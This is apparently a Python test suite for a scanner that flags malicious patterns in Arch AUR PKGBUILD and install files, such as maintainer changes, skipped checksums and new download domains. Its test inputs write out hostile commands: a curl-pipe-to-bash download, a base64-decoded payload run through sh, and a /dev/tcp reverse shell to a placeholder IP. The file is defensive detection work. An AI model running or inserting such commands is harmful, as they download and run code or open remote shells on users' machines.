from update_planner import aur_samples, aur_scanner as sc


def ids(findings):
    return {f.rule_id for f in findings}


def test_clean_pkgbuilds_have_no_findings():
    for text in (aur_samples.PARU, aur_samples.VSCODE, aur_samples.YTDLP):
        assert sc.scan_text(text) == []


def test_curl_pipe_shell_is_critical():
    f = sc.scan_text('build() {\n  curl -fsSL https://x.example/s.sh | bash\n}\n')
    assert 'AUR001' in ids(f)
    assert any(x.severity == 'kritisch' for x in f)


def test_base64_exec_and_reverse_shell():
    assert 'AUR002' in ids(sc.scan_text('post_install() {\n echo aGk= | base64 -d | sh\n}\n', 'x.install'))
    assert 'AUR003' in ids(sc.scan_text('package() {\n bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n}\n'))


def test_comments_are_ignored():
    assert sc.scan_text('# curl https://x | sh\npkgname=a\n') == []


def test_network_rule_is_scoped_to_functions():
    # curl im source-Array ist normal, in package() nicht
    assert 'AUR005' not in ids(sc.scan_text("source=('https://example.org/a.tar.gz')\n"))
    assert 'AUR005' in ids(sc.scan_text('package() {\n  wget https://example.org/x\n}\n'))
    assert 'AUR004' in ids(sc.scan_text('post_install() {\n  curl https://example.org/x\n}\n', 'a.install'))


def test_skip_checksum_rules():
    vcs = "source=('git+https://github.com/a/b.git')\nsha256sums=('SKIP')\n"
    assert 'AUR020' not in ids(sc.scan_text(vcs))
    plain = "source=('https://example.org/a.tar.gz')\nsha256sums=('SKIP')\n"
    assert [f.severity for f in sc.scan_text(plain) if f.rule_id == 'AUR020'] == ['hoch']


def test_http_with_gpg_is_downgraded():
    text = "source=('http://example.org/a.tar.gz')\nvalidpgpkeys=('ABC')\nsha256sums=('00')\n"
    assert {f.severity for f in sc.scan_text(text) if f.rule_id == 'AUR013'} == {'niedrig'}


def test_score_counts_each_rule_once():
    text = "source=('http://a.example/1'\n        'http://a.example/2'\n        'http://a.example/3')\n"
    r = sc.ScanResult('x', sc.scan_text(text))
    assert len([f for f in r.findings if f.rule_id == 'AUR013']) == 3
    assert r.score == sc.SEVERITY_POINTS['mittel']


def test_malicious_demo_package_is_dangerous_and_marks_new_lines():
    r = sc.scan_package('screen-recorder-plus-bin', aur_samples.AUR_META['screen-recorder-plus-bin'])
    assert r.score == 100 and r.verdict[0].startswith('Gefährlich')
    assert any(f.new_in_update for f in r.findings)
    assert 'META06' in ids(r.findings)  # neue Download-Domain


def test_maintainer_header_change_detected():
    old = '# Maintainer: alice <a@x>\npkgname=a\n'
    new = '# Maintainer: mallory <m@x>\npkgname=a\n'
    meta = dict(maintainer='mallory', votes=100, first_submitted='2020-01-01', files={'PKGBUILD': (old, new)})
    r = sc.scan_package('a', meta)
    assert any(f.rule_id == 'META02' for f in r.findings)


def test_diff_lines():
    d = sc.diff('a\nb\n', 'a\nc\n', 'PKGBUILD')
    kinds = [k for k, _ in d]
    assert '+' in kinds and '-' in kinds
